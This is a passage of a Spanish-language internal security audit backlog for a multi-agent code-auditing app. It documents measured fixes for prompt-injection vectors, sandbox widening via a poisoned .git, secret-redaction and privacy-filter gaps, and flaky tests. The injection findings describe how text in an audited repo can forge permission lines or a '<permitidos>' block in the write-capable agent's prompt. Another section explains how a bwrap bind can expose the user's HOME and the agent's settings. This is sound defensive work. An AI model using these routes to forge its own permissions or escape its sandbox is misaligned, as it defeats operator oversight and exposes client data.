  `U+202F`, `U+3000`, BOM) sobrevivían SOLOS y morían en pareja, porque la segunda
  exigía dos blancos seguidos. Los que JavaScript **nunca** considera blancos (NEL,
  espacio de ancho cero, los cuatro controles de dirección, nulo, SOH, ESC, DEL)
  sobrevivían siempre.
  **Y la medición destapó un VECTOR DE INYECCIÓN de punta a punta, sin un solo
  carácter exótico.** Un título de hallazgo con un salto de línea NORMAL pasa el
  parser del informe del escáner y `parse-analysis.ts:44`, que solo hacen `trim`, y
  llega al prompt del GENERADOR, el único agente con permiso de escritura, donde
  escribe `NO_TOCAR: nada` y `PERMITIDOS: todo el repo` como líneas propias; el
  `NO_TOCAR` real aparecía después, contradicho. Es código del cliente forjando las
  instrucciones del agente que edita.
  **Arreglo aplicado, tres commits:** una sola clase de caracteres
  (`/[\p{Cc}\p{Cf}\p{Zl}\p{Zp}\p{Zs}]+/gu`) reemplaza las dos sustituciones y
  colapsa la RACHA, así que no depende de cuántos vengan seguidos; el control de
  seguridad (`aplanarParaPrompt`) se separa del tope; y los cuatro neutralizadores
  duplicados pasan al control compartido `sanearCampoDePrompt`.
  **Verificado en vivo:** 0 de 22 sobreviven, el título envenenado llega en UNA
  línea y ni `NO_TOCAR` ni `PERMITIDOS` se forjan. Diez mutantes muertos, gate 6/6
  por commit y sobre main, las cuatro pruebas sin cambio.
- **CUATRO cosas que la medición del saneador CORRIGIÓ de esta auditoría.**
  *Medidas el 2026-09-27.* (1) Son **cuatro** neutralizadores duplicados, no tres.
  (2) El del crítico vive en `src/domain/chat/critico-prompt.ts`, no en `repair/`.
  (3) El cuarto, el juez del plan, **no debe aplanarse y por eso no se aplanó**: lo
  que recibe es la prosa que el productor escribió, multilínea legítima y OBJETO
  del juicio de OMEGA, igual que el diff. Solo le toca `neutralizarMarcas`. La
  regla que queda: aplanar donde el texto es un dato de una línea, conservar donde
  es el objeto del juicio. (4) El **tope de 200 caracteres habría mutilado análisis
  legítimos**: `repair_proposals.analysis_reason` llega a **1526** caracteres en la
  base viva, con media de 161. Por eso el control de campo va sin acotar.
- **FUGA SECUNDARIA cazada por un mutante, y cerrada en el mismo arco.** *Medida
  con un lanzamiento real.* El `message` del error de Node cuando un argumento
  lleva un byte nulo trae el argumento ENTERO —«Received '…'»— y ese argumento es
  el prompt, con las citas del repo auditado dentro. Ponerlo en la respuesta lo
  habría escrito en el historial. El motivo se compone con `error.code` y nunca con
  el mensaje, y un mutante lo prueba. Ni esta auditoría ni la medición inicial la
  vieron.
- **~~La observación de parada por error mete el mensaje crudo.~~** — **ARREGLADO
  Y VERIFICADO EN VIVO** `b949c34` (2026-09-28). Era la **única** rama del sistema
  nervioso que metía texto libre: su gemela del standby clasifica doce líneas más
  abajo, y las cuatro hermanas —fallo, IPC, render y denial— derivan todas de dato
  clasificado. Costaba tres cosas a la vez, medidas con SQLite real: **bailaba**
  (diez reintentos sembraban diez avistamientos donde debía haber uno, porque el
  UNIQUE de avistamientos incluye la nota), **no tenía tope** (un mensaje de 5.000
  caracteres se guardaba entero: el tope de 500 solo alcanza a lo que viene de un
  modelo) y **llevaba datos del cliente**.
  **Corrección medida a este mismo hallazgo:** el cerco SÍ tacha rutas, citas y
  tokens; lo que deja pasar son nombres de tabla, correos y fragmentos de SQL, y
  su propio docblock lo admite como límite honesto.
  **Y una corrección al arreglo previsto:** reutilizar las clases de la gemela NO
  bastaba. Están afinadas para fallos del proveedor y dejaban **6 de 8** caídas
  reales en «sin clasificar», o sea una nota sin valor diagnóstico. La nota sale
  ahora de TRES ejes cerrados o validados: la clase del error, el código de sistema
  cuando lo hay y la clase transitoria cuando el mensaje la delata. Once de once
  casos dan resultado estable. El cerco de privacidad es **por construcción**: el
  código solo entra si tiene forma de código de sistema, así que un `pacientes.dni`
  no pasa. El crudo sigue en `stoppedReasonDetail`, que el operador ve y no se
  exporta.
  **Verificado en vivo:** 10 avistamientos → 1; ninguno de los seis datos
  sensibles llega a la nota; la nota pasa de 5.028 caracteres a 53. Las cinco ramas
  hermanas, sin tocar (la gemela comparada byte a byte). 4 mutantes muertos, dos de
  ellos vivos en la primera pasada y los dos tenían razón.
- **`innegociables-red.ts` no se protege a sí misma.** *Verificado: comprobadas
  las nueve de la familia, ocho nombran su propia ruta y esta no.* Un fix
  pequeño puede vaciar `DEFENSAS_DE_LA_RED` sin tocar un fichero protegido, y el
  cerco lo integraría solo; después quedan al alcance `checkpoint-transitorio.ts`
  y `con-red-de-reversion.ts`, la red de ADR-079. **Arreglo:** añadir su propia
  ruta y derivar el test de auto-cobertura de las nueve, no enumerarlas.

### 9.2 P0 — Seguridad grave

- **~~EL MÁS GRAVE. Un informe cuyas entradas se caen todas da «proyecto limpio»
  y 100/100.~~** — **ARREGLADO Y VERIFICADO EN VIVO** `26f4db4` (2026-09-27).
  **Eran TRES bugs y no dos**, y el tercero salió al trazar el efecto del arreglo:
  `filas-del-cierre.ts` escribía el score y llamaba a `projects.updateScan`
  **sea cual fuera el motivo**, así que arreglar el parser cambiaba la etiqueta a
  ABORTADO y dejaba el 100 en el tablero igual. Los cuatro commits: la caja de la
  severidad se normaliza DENTRO del parser (`severidad-del-informe.ts`) y el guard
  de la base sigue estricto a propósito, con un test que clava la asimetría; las
  notas de ADR-085 se rescatan por el embudo del fallo antes de que el informe se
  tire, medido limpio porque `notes` es clave hermana de `findings` y la valida su
  propio validador; `list.length > 0` con resultado vacío da `err(UNREADABLE)`; y
  `notaDelCierre` devuelve null con cero paradas, así que ni el proyecto ni la
  fila puntúan. **Verificado en vivo con el módulo compilado:** minúscula y
  capitalizado pasan de 0 a 3 hallazgos, el limpio declarado sigue válido con 0,
  y todas caídas da error en vez de 100/100. **Y con SQLite real:** con cero
  paradas el tablero se queda en 63 y la fila en el score provisional; con una
  parada sube a 92. Nueve mutantes muertos, gate 6/6 sobre main y las cuatro
  pruebas sin cambio. Diagnóstico original, que se conserva: *verificado.* `src/domain/scan/parse-scan-output.ts:64` devuelve
  `ok([])` cuando la lista traía entradas y todas fallaron el guard, y su propio
  docblock `:9-13` llama a eso «*la peor mentira que podría contar esta app*».
  El disparador es barato: `isSeverity` (`shared/severity.ts:12-13`) distingue
  mayúsculas, así que un informe entero con `"severity":"high"` se convierte en
  proyecto limpio. Nadie aguas abajo compara la longitud de la lista con el
  resultado. En un proyecto sin hallazgos previos eso es un 100/100 falso; en uno
  con hallazgos vivos, la ausencia no extingue, así que la mentira es más
  pequeña y sigue siendo real: pierde en silencio todo lo que ese escaneo vio.
  **Arreglo:** `err(UNREADABLE)` si `list.length > 0` y el resultado queda vacío,
  y aceptar la severidad sin distinguir mayúsculas antes de validarla.
- **RESIDUO del arreglo anterior: un informe PARCIALMENTE ilegible pasa en
  silencio.** *Medido con el módulo compilado, 2026-09-27.* El arreglo cubre «la
  lista traía entradas y no sobrevivió ninguna»; NO cubre el descarte masivo
  PARCIAL. Con una entrada buena y nueve malas, `parse-scan-output.ts` devuelve
  `ok` con una y las otras nueve se pierden sin que nada las cuente: un escaneo
  que perdió el 90 % de lo que vio parece un escaneo exitoso con el 10 %. Medido:
  1 buena de 10 da `ok` con 1; 5 de 10 da `ok` con 5; 0 de 1 sí da error. Nadie
  mide lo descartado, ni en el parser ni aguas abajo. **Arreglo:** contar los
  descartados por pasada y decidir con el número delante — error por encima de un
  umbral, o el dato al termómetro que ya existe para lo inclasificable (ADR-081).
- **Los hermanos del guard de mayúsculas: CORREGIDA una afirmación propia.**
  *Medido fichero por fichero, 2026-09-27.* Se reportó «cinco hermanos, dos
  degradan a MEDIUM en silencio». **Es falso, y se corrige aquí:** los tres que
  caen a MEDIUM —`veredictos-del-lote.ts:39`, `retipado-de-otros.ts:52`,
  `reclasificacion-de-zombis.ts:35`— leen `severity: string` de FILAS DE LA BASE
  (`ZombiAJuzgar`, `FilaOtro`, `Candidata`), no informes de un modelo. Ahí el
  guard estricto es lo CORRECTO por la asimetría que fija
  `severidad-del-informe.ts`, y MEDIUM es el respaldo de una fila corrupta. De los
  tres que sí leen texto escrito por un modelo o por una mano, dos fallan bien y
  lo dicen: `auto-merge-fields.ts:11-12` devuelve null y `auto-merge-config.ts:52`
  rechaza la configuración con un error legible; `migrate-extinct.ts:8-11`
  devuelve la entrada intacta antes que corromperla, y su docblock lo declara.
  **Queda uno solo y es menor:** `parse-patterns.ts:29` y `:51` dejan el patrón
  con `severity: null` si el log trae la severidad en minúscula. **Arreglo:**
  ninguno urgente; si se toca ese fichero, reusar `severidadDelInforme`.
- **NOTA de mantenimiento: `parse-scan-output.ts` quedó en 75 líneas EXACTAS.**
  Es el techo de `max-lines`, así que el siguiente cambio en ese fichero obliga a
  partirlo. No es deuda de seguridad; es la trampa que espera a quien lo abra.
- **~~`PGPASSWORD=` no se tacha, y un SHA de git sí.~~** — **ARREGLADO Y
  VERIFICADO EN VIVO** `4fc30c0` (2026-09-28). **No eran dos defectos opuestos
  sino TRES piezas**, y la tercera solo la vio la medición.
  **(1) El primero no era uno, era una FAMILIA de trece.** Todos con el prefijo
  PEGADO a la palabra: las contraseñas de Postgres, MySQL, Redis y SMTP, y los
  tokens de GitHub y Slack escritos sin separador. Con guion bajo funcionaba;
  pegado, no. El arreglo quita la condición de la letra solo a las palabras
  LARGAS, que no colisionan con nada, y la conserva para `key` y `pwd`, que son
  sufijo de ocho palabras reales de `monkey` a `whiskey`. Pasó de tachar 24
  secretos a 33 sin romper ninguno de los 14 textos legítimos.
  **(2) El comodín del hash se RETIRA, y su historia lo explica.** Nació para la
  línea EN VIVO y su propio commit lo dice, «solo en vivo por onChunk: NO se
  persiste»; pero hoy `redactSecrets` tiene **17 llamadas en 15 módulos** y la
  mayoría SÍ persisten, así que una regla efímera derivó a la persistencia y acabó
  borrando del recibo el identificador de un commit, un resumen de integridad y el
  digest de una imagen. Dos mutantes prueban que acotarlo no basta: a 64 sigue
  borrando el resumen de integridad y a 40 el identificador del commit, porque las
  longitudes forenses son las mismas que las de un secreto hexadecimal.
  **(3) Y el comodín tapaba TRES credenciales por accidente.** Al retirarlo
  quedaban al descubierto la credencial tras `curl -u`, la de dentro de una
  dirección de Postgres y el encabezado de autorización, en cuanto el valor no
  fuera hexadecimal — y una contraseña rara vez lo es. Se cubren por diseño, por el
  SITIO donde viven, conservando el usuario y la arroba para que la línea siga
  legible: `curl -u api:*** https://x`.
  **Verificado en vivo:** 22 de 22 escapados ahora tachados, 6 de 6 huellas
  forenses intactas, 6 de 6 credenciales de contexto tapadas, 20 de 20 comandos
  reales del agente sin tocar. De las nueve reglas de forma solo cambió una; las
  otras ocho, idénticas. El coste BAJÓ a 0,2 ms sobre 50.000 caracteres, porque el
  comodín era la regla más cara. 16 mutantes muertos.
- **Los costes ACEPTADOS del tachado, y el hueco que se descartó midiendo.**
  *Medidos el 2026-09-28, fijados en test para que sean deliberados.* Dos falsos
  positivos: `betoken=` se tacha por acabar en `token`, palabra arcaica inglesa; y
  una palabra del diccionario escrita ENTERA en mayúsculas seguida de `=`
  (`MONKEY=banana`) tiene la MISMA forma que `MYKEY=` y no hay manera de
  separarlas. Se elige ese lado a propósito: tachar de más cuesta legibilidad en
  una línea que casi nunca existe, no tachar cuesta una credencial en disco.
  **Y un hueco conocido:** la forma de MySQL, con la clave pegada a la bandera, se
  DESCARTÓ porque destrozaba **6 de 12** órdenes que el agente auditor corre a
  diario — `find -print`, `-path`, `-prune`, `-perm`, `rsync --progress` y
  `npm --prod` —. La diferencia entre un puerto y una clave es solo el espacio.
  `mysql -pclave` no se tacha, y está escrito en `secreto-por-contexto.ts`.
- **~~Un test que guarda seguridad es INTERMITENTE.~~** — **RESUELTO POR LA CAUSA,
  NO POR EL CASO** `b949c34` (2026-09-28). El hallazgo era la punta; medir la clase
  dio el iceberg.
  **La clase, medida:** **44 ficheros** de test lanzan procesos REALES —`git`, el
  binario del grafo, procesos en caja—, de ellos **41 sin techo propio** y unos 170
  bloques de prueba. El primer barrido se quedó en 22 porque buscaba la llamada
  DENTRO del test, y los dos intermitentes conocidos lanzan a través de un arnés:
  hubo que barrer también los siete arneses y sus importadores. Parchear los dos
  que se veían habría dejado 39 ficheros intermitentes.
  **La causa no es lentitud, es INANICIÓN DE TURNO.** El segundo intermitente
  —borrado de rama con worktree, nueve procesos entre `git` síncronos, un
  `worktree add` y un `git` asíncrono— tarda **118 ms aislado** y se pasó de 5.000
  bajo carga: 42 veces. Un test de 118 ms no es lento; lo que no consigue es turno
  para arrancar un proceso con 862 suites en paralelo.
  **Y el dato que lo cierra:** el test más lento de TODA la suite mide **3.256 ms**,
  ya al 65 % del techo por defecto. Cinco segundos estaba apretado para la suite
  entera, no solo para los 44.
  **El arreglo es una línea en `vitest.config.ts`,** `testTimeout` de 20 s, y no 41
  parches: cubre los 44 de hoy y el fichero que alguien escriba mañana, que un
  parche por fichero nunca cubriría. La aritmética del número está en su docblock:
  el más lento real 3,3 s, la peor degradación observada unos +5 s absolutos, el
  peor caso realista ~8,3 s, y 20 s deja 2,4 veces eso.
  **Los dos techos por test se quedan** en `grafo-instalado` y
  `grafo-aislado-rechaza`: allí documentan la medición donde se lee. Son la
  explicación; la defensa es la línea global.
  **COSTE ACEPTADO:** un test que de verdad se cuelgue tardará 20 s en fallar en vez
  de 5. Con el más lento real en 3,3 s, esto no tapa la lentitud de nadie.
  **Probado:** cuatro pasadas de la suite completa, las cuatro con 4.650 en verde y
  cero fallos. Antes de la línea, tres pasadas daban un intermitente en la segunda.
  **Coste que tuvo antes de arreglarse:** tumbó el gate en dos arcos distintos, unos
  20 minutos de relanzar cada vez, y una vez llevó a comitear sobre rojo.
- **~~El corpus que declara el repo auditado entra crudo a nueve prompts.~~** —
  **ARREGLADO Y VERIFICADO EN VIVO** `3c8a77d` (2026-09-29). **Eran OCHO
  constructores y no nueve**: el noveno, `plantilla-ausente.ts:10`, solo nombra
  `buildDocsFirst` en un docblock. Y los ocho pasan por un ÚNICO cuello, así que
  el arreglo es UN punto: `docs-first-compose.ts:59` sanea cada entrada AL
  EMITIRLA, con el `sanearCampoDePrompt` que ya existía, DESPUÉS del filtro por
  categoría para que la categoría se siga decidiendo con el nombre real. En la
  frontera del prompt y no en el dato: las rutas se guardan crudas y **nunca se
  resuelven en disco** —el único uso es esa línea—, así que sanear no puede
  romper ninguna lectura porque no hay lectura.
  **La medición corrigió el hallazgo en lo que más importa: el corpus tiene DOS
  orígenes con riesgo opuesto.** El DESCUBIERTO construye cada ruta con
  constantes nuestras —búsqueda de nombre EXACTO contra 12 documentos y 4
  carpetas—, así que no es vector. El DECLARADO en `.fortress/config` admite
  cualquier cadena y SUSTITUYE al descubrimiento entero: ese es el vector, y es
  el mismo fichero cuya huella ADR-102 §4 ya vigila para pausar el motor.
  **Era PEOR que el título del saneador:** al corpus no se le aplicaba NINGUNO de
  los dos controles, así que emitía `<` y `>` de verdad y falsificaba un BLOQUE
  entero y no una línea, y su sitio es la última palabra que el generador lee
  antes de las Reglas —medido: un `<permitidos>` forjado que se concedía el
  `NO_TOCAR` real y `.fortress/`, la persistencia del propio ataque—.
  **Pero PREVENTIVO, no daño en curso:** ninguno de los 8 proyectos declara
  corpus (dos tienen `.fortress/config` sin la clave, seis no tienen fichero).
  **El cuidado de medir ANTES de construir pagó:** los 24 corpus reales de los 8
  proyectos salen con sus rutas LITERALES, **0 alteradas**, y no hay riesgo
  multilínea porque la línea del corpus es de una sola línea por construcción.
  **Verificado en vivo con los módulos reales:** la línea del corpus envenenado
  sale con 0 saltos, 0 `<`, 0 `>` y 0 acentos graves; el generador queda con 1
  `<permitidos>` y 1 `</permitidos>`, los de verdad, y su prompt crece 2 líneas y
  no las 5 del payload; OMEGA queda con 1 `<hallazgo>`, 1 `<analisis>` y 1
  `VERDICT:{`, los de la plantilla. Ocho mutantes muertos, gate 6/6 sobre main y
  las cuatro pruebas sin cambio.
- **~~RESIDUO DEL MISMO ARCO: el corpus heredaba doctrina de
  `Object.prototype`.~~** — **ARREGLADO** `2482a25` (2026-09-29). No estaba en el
  informe: salió al medir. `CATEGORY[name] ?? null` sobre un objeto literal
  devuelve lo HEREDADO, que no es nulo. Medido en un repo de verdad: una carpeta
  `docs/toString/` del proyecto auditado se citaba al agente como doctrina
  FIRMADA del proyecto, y un `docs/constructor` se descubría con una FUNCIÓN por
  categoría. No es inyección —los nombres están acotados al prototipo— pero es la
  misma afirmación falsa que el corpus existe para quitar, colada por un agujero
  del lenguaje en vez de por un nombre mal elegido. `Object.hasOwn` en las DOS
  tablas, que es el patrón que la casa ya usaba en `registros-de-paquetes.ts:36` y
  `defectos-de-auditoria.ts:41`: las del corpus eran las que no lo tenían. Un
  mutante con el guard SOLO en los documentos cae, y era el que importaba: el daño
  medido venía de la tabla de CARPETAS, no de la de documentos.
- **~~Tres prompts meten texto ajeno sin aplanar.~~** — **YA ESTABA RESUELTA**
  antes de que esta lista se escribiera, y la entrada estaba obsoleta. El arco del
  saneador la cerró: `87c2e4c`, mergeado en `3810e5c` el 27-sep. **Medido hoy al
  tocar el fichero de al lado, no supuesto:** cero `safe()` propios en los tres
  (`generator-prompt.ts`, `omega-prompt.ts`, `critico-prompt.ts`) y los tres
  llaman al control compartido `sanearCampoDePrompt`, que aplana Y neutraliza.
  Queda dicho aquí para que no se vuelva a abrir.
- **~~El analista pide el área en texto libre.~~** — **ARREGLADO** `d3abb45`
  (2026-09-29), y **RECLASIFICADO: es P1 de CALIDAD, no P0 de seguridad.** La
  auditoría lo marcó P0 por un vector que el embudo ya cerraba, y medirlo lo
  desmintió: `toSelfNotes` llama a `aArea` en el embudo por el que pasan las DOS
  puertas, así que el texto libre **no llega a la columna**. Lo comprobé donde de
  verdad podía haber quedado crudo —`proposal_events.evidence_json`, que persiste
  el análisis ENTERO con sus `notes`— y el texto libre **se corta exactamente en
  el cierre del vocabulario** (12-sep): 115 eventos antes con 352 áreas libres y
  0 cerradas; 39 eventos después con 95 cerradas y **0 libres**. Además
  `analysis_reason` (177 filas) no contiene ni una vez la clave `"area"`, y
  `agent_runs` no guarda salida cruda. Los P0 de seguridad los cerró la trifecta.
  **La mitad de CALIDAD sí era real, y grande.** La era del vocabulario cerrado
  tiene 31 filas —las 31 del backlog—: **5 en `otro` con 196 avistamientos** y 26
  clasificadas con 124. Las cinco son **una por cada `kind`**, que es la huella
  exacta de un agente cuyo área siempre colapsa, porque la dedup funde por
  `(kind, area)`. **El 16 % de las filas se comía el 61 % de la señal.**
  **El arreglo:** el analista pide el área por la constante COMPARTIDA, que
  enumera las 18 y dice «se ELIGE de esta lista, no se inventa»; se fueron su
  `NOTA` propia y sus nueve líneas de párrafo duplicado —una quinta redacción de
  lo que el módulo compartido existe para unificar—. Se conserva a propósito su
  ejemplo con el objeto ENTERO: es la lección de ESTE prompt, que leyó «notes»
  como sección aparte y respondió en dos bloques. Y entra en el guardián
  `quien-observa.test.ts`.
  **UN MUTANTE MÍO SOBREVIVIÓ Y TENÍA RAZÓN:** sacar al analista de la lista del
  guardián NO rompía nada, porque un `it.each` con una fila menos corre menos
  casos y pasa — el guardián no se guardaba a sí mismo. Se cerraron los dos
  agujeros que eso destapó: un PISO en la lista (quitar una fila ahora falla) y
  un test DERIVADO DEL FUENTE que exige que quien lleve el texto de la petición
  lo importe. Medido antes de escribirlo: ese texto vive en UN solo sitio y lo
  importan exactamente cinco ficheros; una copia falsa metida en
  `generator-prompt.ts` lo tumba, así que cubre también el prompt de mañana.
  **DOS AVISOS HONESTOS.** (1) El fichero **NO encogió: creció**, 71 → 73 líneas.
  Las nueve duplicadas se fueron a una importada, pero la explicación ocupa
  sitio; se proyectó que encogería y no fue así. (2) El arreglo **no toca la
  base**: las 5 filas viejas en `otro`, con el 61 % de la señal, siguen ahí. El
  arreglo endereza la señal FUTURA; reclasificar las viejas es un lote aparte con
  el kit, y es decisión de Jojo. Tres mutantes muertos, gate 6/6 sobre main y las
  cuatro pruebas sin cambio.

### 9.2bis P1 — El hueco de las listas-guardián que se recorren a sí mismas

- **Una lista-guardián verificada con `it.each` sobre SÍ MISMA no se guarda a sí
  misma.** *Medido tres veces, las tres con un mutante que SOBREVIVIÓ.* El patrón
  es `it.each(LISTA)('%s …')`: quitar un elemento de `LISTA` hace que el test
  corra **un caso menos** y **pase**, en vez de fallar. La lista es a la vez el
  sujeto y el juez.
  **Apareció en tres sitios y los tres están cerrados** —fijando la lista ENTERA
  con `toEqual`, o con un piso de longitud—: el guardián de las notas
  (`quien-observa.test.ts`, 2026-09-29), el de la puerta de selección
  (`innegociables-seleccion.test.ts`, ADR-106) y el del perímetro del Motor
  (`innegociables-perimetro.test.ts`, ADR-107).
  **SIN REVISAR: las demás listas-guardián del repo.** No se han buscado, así que
  no se sabe cuántas hay ni cuáles tienen el hueco. **Arco propio, barrido corto
  de una tarde:** encontrar todo `it.each` cuyo argumento sea la lista que el
  propio test protege, y cerrarlo con `toEqual` de la lista entera. Se anota en
  vez de hacerse ahora porque mezclarlo con la cura del perímetro juntaría dos
  sujetos en un arco, y el hueco no es de seguridad: es de confianza en el test.

### 9.3 P0 — Seguridad con efecto SIN MEDIR: medir antes de priorizar

- **~~La cota de anchura de la caja solo mira el proyecto.~~** — **ARREGLADO Y
  VERIFICADO EN VIVO** `10d3a68` (2026-09-29). **El efecto que faltaba se midió
  con un `bwrap` 0.9.0 real, y salió lo peor de las dos opciones: un `--bind`
  posterior SÍ destapa el `--tmpfs` anterior sobre la misma ruta.** Con control:
  sin el `.git` envenenado la caja solo mostraba `.nvm` dentro de `/home/jojo` y
  el testigo no existía para ella; con él, el proceso listaba el HOME real
  entero, lo leía, y **dejó un fichero en el disco de verdad, fuera de la caja**.
  Alcance medido: `~/.claude` con `settings.json` y `settings.local.json` —las
  barreras mismas— y `~/.config/.../fortress.db`, la base viva, con `test -w` en
  rc=0. Y una **variante CRUZADA que el informe no vio**: con
  `gitdir: …/Escritorio/Trade99PRO/worktrees/x` la caja listaba el repo de OTRO
  cliente. Era P0, no una costura.
  **Tres piezas, y la de la anchura sola no bastaba.**
  **(a)** La cota de «demasiado ancho» rige ahora para TODAS las rutas que se
  montan en su propio sitio, no solo el proyecto (`ruta-de-la-caja.ts`). `r.home`
  queda fuera a propósito: no es contenido que se monte, es el destino del tmpfs
  que TAPA. **Y con ella salió un fallo que habría sido total y silencioso:**
  `flags-de-bwrap.ts` metía `caja.socketDelProxy ?? '/'` como relleno en la
  lista, y `/` es lo más ancho que existe; sin red es el camino por DEFECTO del
  motor, así que la caja habría dejado de levantarse entera diciendo «ruta
  demasiado ancha» de una ruta que nadie pidió montar. Corregido en el MISMO
  commit porque son dos mitades de un cambio: el mutante que restaura el relleno
  tumba NUEVE tests.
  **(b)** El `.git` del repo auditado ya no es fuente de verdad: solo abre
  escritura si el worktree que nombra EXISTE como directorio
  (`lo-que-ve-la-caja.ts`). Es lo único que caza la variante cruzada —ese
  directorio el atacante no lo puede crear dentro del repo de otro— y la anchura
  no llegaba. El mutante que importó: comprobar que existe el COMÚN en vez del
  gitdir completo deja pasar el vector, porque `/home/jojo` sí existe.
  **(c)** La defensa atada a lo que el fichero DEFINE y no a su carpeta
  (`innegociables-caja.test.ts`).
  **CORRECCIÓN de la nota que llevaba esta misma entrada.** Decía que
  `lo-que-ve-la-caja.ts` no estaba en el barrido de innegociables y que
  ensancharlo no exigía firma. **Es FALSO**, medido con `cubierto()`:
  `innegociables-disco.ts:22` ya lo cubre con el glob
  `src/infrastructure/sandbox/**`, así que ya exigía firma. Lo que añade (c) es
  atar esa defensa a la FUNCIÓN en vez de a la ruta —si el fichero se muda, el
  glob deja de cubrirlo y nada avisa—, que es justo lo que promete el docblock
  del barrido. Y un dato que salió midiendo: **ese módulo no tenía ni un test**,
  siendo el que rellena la lista de escritura de la caja desde un fichero del
  cliente; ahora tiene CINCO casos.
  **Verificado en vivo tras el arreglo, con el mismo `bwrap`:** el vector da `[]`,
  no hay `--bind` del HOME, la caja vuelve a ver solo `.nvm`, leer el testigo da
  rc=1, escribir fuera da rc=1 y no queda nada, y `~/.claude` y la base viva son
  invisibles; el cruzado da `[]` y el repo del otro cliente es invisible; y el
  worktree LEGÍTIMO del motor sigue pasando —dentro de la caja `git status` y
  `git rev-parse` dan rc=0, con su rama real—. Cinco mutantes muertos, gate 6/6
  sobre main y las cuatro pruebas sin cambio.

### 9.4 P1 — Funcionales graves

- **~~El clasificador de fallos del loop marca terminal como transitorio.~~** —
  **CERRADA POR RETIRADA el 2026-09-30 (ADR-107).** `failure-kind.ts` y su
  hermana `clase-del-fallo.ts` se borraron con el LOOP, y **hoy no queda ningún
  clasificador de fallos en el repo** (verificado por grep: 0 referencias a
  `classifyFailure`, `failure-kind` y `clase-del-fallo`). El `\bred\b` que
  faltaba **nunca se aplicó**: el fichero se fue con su bug dentro. Si algún día
  vuelve a hacer falta clasificar un fallo, esta medida es el aviso de por dónde
  se rompe. La medida original:
  *Verificado, medido con la regex real.* En
  `src/domain/loop/failure-kind.ts:10-11` la palabra `red` va sin límites de
  palabra y casa dentro de `required`, `reviewer`, `occurred` y `hundred`:
  «missing **requi**red argument», «igno**red** by the reviewer» y «hund**red**
  limit» salen los tres transitorios. El loop entra en standby y reintenta una
  vez por minuto contra algo que no se recupera, que es justo lo que su docblock
  dice evitar. Su hermana `CLASES`, mergeada el 26-sep, sí usa `\bred\b`, y su
  docblock afirma que las clases «calcan los grupos de `classifyFailure`»: no los
  calcan. **Arreglo:** `\bred\b`.
- **El informe declara auditados cuatro módulos que ninguna parada audita.**
  `informe-campana.ts:23-25` imprime «APLICA — auditado con su plantilla» por el
  simple hecho de que la plantilla esté sembrada. M1, M5, M6 y M10 son aplicables
  y no están ni en `MODULOS_DE_CARPETA` ni en `MODULOS_DE_TEMA`, así que nunca
  reciben pasada. Es la decisión 4 de ADR-083 al revés, en el documento que el
  operador entrega. **Arreglo:** que el cierre lleve los aplicables sin pasada y
  el informe los imprima como tales.
- **Las dos acciones del grafo no cierran el conjunto de servidores.**
  *Verificado.* `index-graph.ts:18` y `verify-graph.ts:23` no llevan
  `--strict-mcp-config`, que sí llevan el turno y el motor, así que heredan los
  servidores de `~/.claude.json`; y la de indexar preaprueba
  `index_repository`, la única herramienta de escritura del grafo, contra el
  servidor que gane ese nombre. **Mitigado hoy**, comprobado: la entrada global
  del operador apunta al binario fijado, sin `npx`. **Arreglo:** el flag en los
  dos, con su aserción.
- **La tarjeta del plan ofrece un workflow que nunca corre.** Para un mensaje
  libre en supervisado, la tarjeta se calcula con `FREE_TRIGGERS` y el turno se
  ejecuta con `TRIGGERS`, que son dos tablas distintas y ya divergen. La tarjeta
  nombra el agente equivocado y sobreestima el coste en cada mensaje libre, que
  es lo contrario de la honestidad que su propio docblock invoca. **Arreglo:**
  derivar los pasos de `routeToAgent`, o no pintar pasos en el workflow libre.
- **El cerco de privacidad deja pasar cuatro formas.** *Medido por el auditor:*
  carpeta multi-palabra en minúscula, `clinica dental madrid` deja dos palabras
  del cliente en el export; `/srv` y `/Volumes` no están anclados; las rutas de
  Windows no las toca ninguna de las cuatro reglas.
  `src/domain/system/reglas-del-cerco.ts:43-51`.

**Otros funcionales del mismo nivel, con evidencia del auditor y sin
re-verificar:** un workflow con todos los pasos excluidos informa 100/100 sin
hallazgos; `esEnvioNegado` valida la puerta y no el motivo, así que el parte del
lote puede escribir `undefined`; el `title` del escáner se escribe sin aplanar en
el COGNITION-LOG del cliente y luego se vuelve a parsear, lo que permite forjar
una cabecera de patrón; el COGNITION-LOG del repo ajeno entra al prompt del
analista por `detectedAt` sin sanear; `parseJuicio` se queda con el primer bloque
donde su hermano se queda con el último por la lección contraria; una llave en la
prosa de OMEGA invalida el juicio del plan y bloquea el lote en silencio; el
comodín `*` pasa el guard del alcance y alcanza al `package.json` que el gate
ejecuta; el chequeo de flags de cookie mira la línea entera, así que el nombre de
la cookie tapa el flag ausente; la cobertura declarada cuenta nueve extensiones y
un proyecto Vue o PHP audita «N de N» sin listar su interfaz.

### 9.5 P2 — Erratas de documento, unas 35

Las de más peso, medidas:

- **`FORTRESS-FUNCIONAMIENTO-ACTUAL.md` está anclado a `main@052638b`**, 65
  commits por detrás, con bloques internos a 198 y 437 commits. De sus 57 citas
  `fichero:línea`, una apunta a `protected-areas.ts`, borrado el 17-sep, y dos
  caen fuera del fichero. Además dice `plan` donde hoy es `auditoria`, cuenta 11
  agentes cuando son 14, y describe el modo efectivo con una causa retirada y sin
  la causa viva de la red git.
- **`IPC.md` afirma 105 canales y hay 118.** Su tabla tiene 115 filas: faltan
  `projects:declarar-modulos`, `scan:stop`, `system:export-observations` y
  `system:import-attended`, y sobra una fila de `system:resolve-observation`, que
  no existe en el código. Medido. Nota: `projects:declarar-modulos` tiene handler
  y no tiene puente en el preload, así que hoy no lo puede llamar nadie.
- **`SECURITY-MODEL.md` no menciona la caja ni el grafo por turno.** Cero
  apariciones de `bwrap`, sandbox, caja, clase A, ADR-092, `CBM_CACHE_DIR` y
  «grafo por turno», medido sobre sus 256 líneas. Ya estaba anotado en §8.2 y
  sigue abierto; ahora le falta también el grafo por turno y el filtro de host
  privado aplicado a los conectores.
- **`TAXONOMIA-DE-DEFECTOS.md` se declara fuente de verdad y lista 16 de los 33
  tipos.** Falta toda la familia de código ajeno, incluido el tipo que usa el
  ejemplo del propio contrato del escáner.
- **`FLOWS/SELF-REPAIR.md` dice que no hay firma en la app**, y existe de punta a
  punta; promete un guard de `base_sha` que el código no tiene; cuenta tres
  veredictos cuando son cuatro; y afirma una extinción automática que ADR-087
  retiró. Su tabla de rechazos se declara completa con 22 de 25.
- **`FLOWS/RETRY.md`: cuatro de seis filas de reintentables son falsas.**
- **El índice de ADRs no lista siete**, entre ellos el del sandbox, el del grafo
  por turno, el de la Fase B y el de la firma. Medido: 104 ficheros, 97 filas.
